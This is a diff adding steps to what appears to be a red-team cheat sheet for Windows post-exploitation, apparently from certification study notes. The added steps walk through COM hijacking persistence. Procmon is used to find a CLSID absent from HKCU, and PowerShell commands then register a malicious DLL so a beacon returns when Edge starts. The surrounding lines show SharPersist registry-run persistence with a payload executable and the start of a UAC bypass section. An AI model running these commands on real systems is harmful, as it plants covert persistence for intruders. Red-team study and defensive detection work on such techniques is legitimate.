@@ -122,7 +122,17 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 3. `execute-assembly SharPersist.exe -t reg -c "C:\tools\malPayloads\artifactx64.exe" -a "/q /n" -k "hkcurun" -v "someNameYouWant" -m add`
 
 ### Persistence for MS Windows via SharPersist - COM Hijacking DLL
-
+1. Open **procmon64.exe** from **sysinternals suite**. 
+2. Apply filters **Operations ---> RegKeyOpen** and **Result ---> NAME NOT FOUND** and **PATH (ends with) ---> InprocServer32**. 
+3. Next open some program, e.g. **MS Word or maybe Edge** etc. 
+4. Get some random **CLSID**. 
+5. Use **Powershell** that the entry does exist in **HKLM**, but not in **HKCU**.
+6. Will show ---> `Get-Item -Path "HKLM:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32"`
+7. But will fail --> `Get-Item -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32"`
+8. Create this CLSID `New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}"`
+9. Specify that malicious dll `New-Item -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}" -Name "InprocServer32" -Value "C:\tools\malPayloads\comhijacking.dll"`
+10. Next command `New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32" -Name "ThreadingModel" -Value "Both"`
+11. now when **MS Edge (internet explorer)** is loaded, you should get a **beacon**. 
 
 ### Windows Privilege Escalation - UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
